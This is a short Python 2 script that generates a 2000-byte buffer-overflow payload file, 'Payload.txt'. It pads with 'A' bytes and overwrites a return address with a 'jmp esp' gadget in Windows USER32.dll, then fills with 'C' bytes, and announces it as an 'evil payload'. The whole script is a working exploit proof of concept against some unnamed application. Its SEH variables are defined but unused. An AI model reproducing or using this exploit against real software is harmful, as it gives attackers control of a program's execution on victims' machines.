#!/usr/bin/python

import struct

nSEH = "B" * 4
SEH = "C" * 4

buffer  = "A" * 1249
buffer += struct.pack("<I", 0x7e484a13) # "\xff\xe4" | C:\WINDOWS\system32\USER32.dll
buffer += "C" * (2000 - len(buffer))

f=open("Payload.txt","w")
print "[+] Creating %s bytes evil payload.." %len(buffer)
f.write(buffer)
f.close()
print "[+] File created!"

